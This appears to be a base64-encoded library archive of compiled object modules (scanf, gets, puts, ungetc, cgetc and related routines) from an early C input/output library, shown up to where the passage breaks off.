AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgHAAAA
APkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAmAcAAAAAAAAAAAAAAA
AAAAAAAAAAAAAASAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAA
AAAEAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4CAAAAAAEAAAAAAAAAF
gIAAAAAAAAAAAAAAAAeAgAAIgIAAAAAAAAAAAAAFkDAAAAAAAAAAAAAAAAAAAEAAAAqAgA
AAAAAAAAAAQAAACoCAAAAAACAAIAAgAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgAAAAAAAA
AAAAAAAAAAAAIAAgACAAIAAgACAAAAAAAAAAAAAAACAAIAAgACAAIABAAEAAQABAAEAAQA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC
AAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX3NjYW5mAAAiAAAAfnNjYW5m
AAACAAAAaXAAAAAAAAABAOL/bnAAAAAAAAABANz/cHRycwAAAAABAOb/agAAAAAAAAABAO
T/awAAAAAAAAABAN7/ZmxwAAAAAAABAOD/cDEAAAAAAAABAAQAcDIAAAAAAAABAAYAcDMA
AAAAAAABAAgAcDQAAAAAAAABAAoAY3N2AAAAAAAgAAAATDIAAAAAAAACAEAAX19JaW5wdA
AgAAAATDYAAAAAAAACACAAX19JZ3N0cgAgAAAAX19JZ2V0YwAgAAAAX19JdW5ncwAgAAAA
X19JdW5nYwAgAAAATDcAAAAAAAACACwATDgAAAAAAAACALAATDQAAAAAAAACAFQATDMAAA
AAAAACAFoAX2NnZXRjAAAgAAAAX3VuZ2V0YwAgAAAATDIwMDAxAAACAG4ATDEwAAAAAAAC
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
Zh34//8Jbv6WJQ4BQB0GAPUKBgDACxUH9QsEAAUDfZ34/wQAtQoEAOYdSv7/CUb+1gs1EP
j/JhD9CQgA1gvAC+UD9Qv4/wcF5h0q/mYd+P//CSL+liV1Lfb/BgDLA/ULBAACAgAKyAE9
igQAwBUBAMMBdwkA/kCdBAAOEN8JAADACwMDwBUBAAQB9YsEAPoDAAp3AOD9ZABWAC4A3g
DeAN4A3gDeAN4A3gDeAOgA6AAWARYBFgEWARYBFgEWAQ4BDgEOAQ4BDgEOARYBFgEWARYB
FgEWARYBFgEWARYBFgEWARYBFgEWARYBFgEWARYBFgEWARYBFgEWARYBFgHwAPAA8ADwAP
AA8AAAAOkAAAAAAAAAAAAAAAAAAAAAAAAAAAD5AAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKQEAAAAAAAA5AQAAAA
AAAAAAKQEAAEkBAAAAAAAAAAAAAAIAAAAAAAAAAAAAACkBAAAAAAAAOQEAAAAAAAAAAAAA
AAAAAAAAAACZAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOkAAAAAAA
AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAmQEAAAAAAAAAAAAAAAAAAAAA6QAAAAAAAADoAgAAAAAAAAAAAAAAAAIAAA
AAAAAAAAAAAAAAAAAAAJkBAAAAAAAAAAA4AwAAAAAAAAAAAAAAAAAAAAAAAAAAAADpAAAA
AAAAAAAAAAAAAPkAAAAAAAAAAAAAAAAAmQEAACkBAAAAAAAAOQEAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAKQEAAEkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
AQAAAAAAADkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADpAAAAAAAAAAAAWA
QAAAAAAAAAAAAAAAAAAAAAAAAAAJkBAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIA
AgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
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
